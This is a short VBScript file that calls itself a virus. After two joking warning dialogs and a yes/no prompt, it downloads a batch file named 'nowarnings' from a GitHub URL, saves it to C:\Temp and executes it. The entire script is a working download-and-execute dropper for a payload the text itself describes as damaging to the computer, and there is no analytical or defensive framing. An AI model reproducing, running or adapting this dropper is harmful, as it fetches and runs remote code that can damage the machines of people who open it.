Set objShell = CreateObject("WScript.Shell")

' Display initial warning messages
intWarning = MsgBox("warning! this can make computer go boom boom cuz this is virus" & vbCrLf & vbCrLf & "epicskid virus omg!!", vbQuestion + vbYesNo, "Warning")

If intWarning = vbYes Then
    ' Display second warning message
    MsgBox "the creater is not responsible for any damage done to this computer, continue???", vbExclamation + vbOKOnly, "LAST WARNING!!"

    ' Download and execute the batch file from the specified URL
    strURL = "https://github.com/HazeeOnYT/epicskid/raw/4d7bb5f74a8a7c5c38918f530973afecfbb408f6/NO-WARNINGS/fynsoskid-nowarnings.bat"
    strSaveTo = "C:\Temp\fynsoskid-nowarnings.bat"

    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", strURL, False
    objHTTP.Send

    If objHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile strSaveTo, 2 ' 1 = adSaveCreateOverWrite
        objStream.Close

        ' Execute the downloaded batch file
        objShell.Run strSaveTo, 1, True
    Else
        MsgBox "Failed to download the file. Error: " & objHTTP.Status, vbCritical + vbOKOnly, "Error"
    End If
Else
    MsgBox "Operation cancelled by user.", vbInformation + vbOKOnly, "Cancelled"
End If
